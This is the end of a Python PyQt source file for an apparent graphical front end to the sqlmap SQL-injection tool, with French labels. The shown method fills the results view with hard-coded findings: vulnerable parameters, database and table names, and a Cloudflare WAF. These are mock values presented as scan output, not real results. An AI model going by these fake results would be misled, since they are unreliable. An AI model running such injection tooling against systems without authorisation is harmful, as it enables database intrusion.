        self.stop_btn.setEnabled(False)
        self.status_bar.showMessage("✅ Scan terminé")
        
        self.results_tree.clear()
        
        vuln_item = QTreeWidgetItem(self.results_tree)
        vuln_item.setText(0, "🔴 Vulnérabilités")
        
        items = [
            ("Paramètre: id - Technique: UNION", "detected"),
            ("Paramètre: page - Technique: Error", "detected"),
            ("Paramètre: user - Technique: Boolean", "detected")
        ]
        
        for text, status in items:
            item = QTreeWidgetItem(vuln_item)
            item.setText(0, text)
        
        db_item = QTreeWidgetItem(self.results_tree)
        db_item.setText(0, "🗄️ Bases de données")
        for db in ["information_schema", "mysql", "test_db"]:
            item = QTreeWidgetItem(db_item)
            item.setText(0, db)
        
        table_item = QTreeWidgetItem(self.results_tree)
        table_item.setText(0, "📋 Tables")
        for table in ["users", "products", "orders"]:
            item = QTreeWidgetItem(table_item)
            item.setText(0, table)
        
        self.results_tree.expandAll()
        
        self.stats_labels['vulns'].setText("3")
        self.stats_labels['dbs'].setText("3")
        self.stats_labels['tables'].setText("3")
        self.stats_labels['waf'].setText("Cloudflare")

# ==================== MAIN ====================

def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    
    window = SQLMapGUI()
    window.show()
    
    sys.exit(app.exec())

if __name__ == "__main__":
    main()